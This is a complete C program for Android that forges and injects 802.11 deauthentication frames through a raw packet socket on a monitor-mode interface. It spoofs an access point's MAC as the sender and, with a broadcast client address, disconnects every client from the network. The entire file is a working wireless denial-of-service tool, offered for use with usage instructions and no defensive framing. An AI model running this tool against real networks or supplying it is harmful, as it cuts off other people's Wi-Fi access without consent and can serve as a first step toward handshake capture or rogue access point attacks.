/* deauth: inject 802.11 deauth frames on a monitor-mode interface (Android).
 *
 * Usage: deauth <iface> <ap_mac> <client_mac> [count] [interval_ms]
 *   ap_mac / client_mac : "bc:3e:07:01:dc:98" or "bc3e0701dc98"
 *   client_mac ff:ff:ff:ff:ff:ff = broadcast (deauth all clients)
 *   count       : number of frames (default 30)
 *   interval_ms : gap between frames (default 100)
 *
 * Frame layout (no radiotap): FC(2) DA(6) SA(6) BSSID(6) seq(2) reason(2)
 * FC = 0x00b0 (mgmt, subtype 11 = deauthentication). SA=BSSID=AP, DA=client.
 * Reason 2 = "sending station is leaving".
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#ifndef ETH_P_802_11
#define ETH_P_802_11 0x800b
#endif

static unsigned char hexval(char c) {
    if (c >= '0' && c <= '9') return (unsigned char)(c - '0');
    if (c >= 'a' && c <= 'f') return (unsigned char)(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return (unsigned char)(c - 'A' + 10);
    return 0;
}
static int mac2bin(const char *s, unsigned char *o) {
    char h[13];
    int k = 0;
    for (int i = 0; s[i] && k < 12; i++) {
        if (s[i] == ':' || s[i] == '-' || s[i] == ' ') continue;
        h[k++] = s[i];
    }
    h[k] = 0;
    if (k != 12) return -1;
    for (int i = 0; i < 6; i++)
        o[i] = (unsigned char)(hexval(h[2 * i]) * 16 + hexval(h[2 * i + 1]));
    return 6;
}
static void macstr(const unsigned char *m) {
    printf("%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s <iface> <ap_mac> <client_mac> [count] [interval_ms]\n", argv[0]);
        return 2;
    }
    const char *iface = argv[1];
    unsigned char ap[6], cli[6];
    if (mac2bin(argv[2], ap) != 6) { fprintf(stderr, "bad ap_mac\n"); return 2; }
    if (mac2bin(argv[3], cli) != 6) { fprintf(stderr, "bad client_mac\n"); return 2; }
    int count = argc > 4 ? atoi(argv[4]) : 30;
    int itv   = argc > 5 ? atoi(argv[5]) : 100;

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_802_11));
    if (fd < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("SIOCGIFINDEX"); close(fd); return 1; }
    int ifindex = ifr.ifr_ifindex;

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_802_11);
    sll.sll_ifindex = ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, ap, 6);
    if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) {
        perror("bind");
        close(fd);
        return 1;
    }

    unsigned char f[26];
    f[0] = 0xb0; f[1] = 0x00;          /* FC: mgmt DEAUTHENTICATION (subtype 11) */
    memcpy(f + 2, cli, 6);             /* DA  */
    memcpy(f + 8, ap, 6);              /* SA  */
    memcpy(f + 14, ap, 6);             /* BSSID */
    f[20] = 0x00; f[21] = 0x00;        /* seq */
    f[22] = 0x02; f[23] = 0x00;        /* reason 2 */

    printf("deauth iface=%s ifindex=%d ap=", iface, ifindex);
    macstr(ap);
    printf(" cli=");
    macstr(cli);
    printf(" count=%d itv=%dms\n", count, itv);

    struct timespec ts;
    ts.tv_sec = itv / 1000;
    ts.tv_nsec = (long)(itv % 1000) * 1000000L;
    int sent = 0, fail = 0;
    for (int i = 0; i < count; i++) {
        ssize_t w = sendto(fd, f, 26, 0, (struct sockaddr *)&sll, sizeof sll);
        if (w < 0) { fail++; if (fail < 3) perror("sendto"); }
        else sent++;
        if (i < count - 1) nanosleep(&ts, NULL);
    }
    printf("sent=%d fail=%d\n", sent, fail);
    close(fd);
    return fail == count ? 1 : 0;
}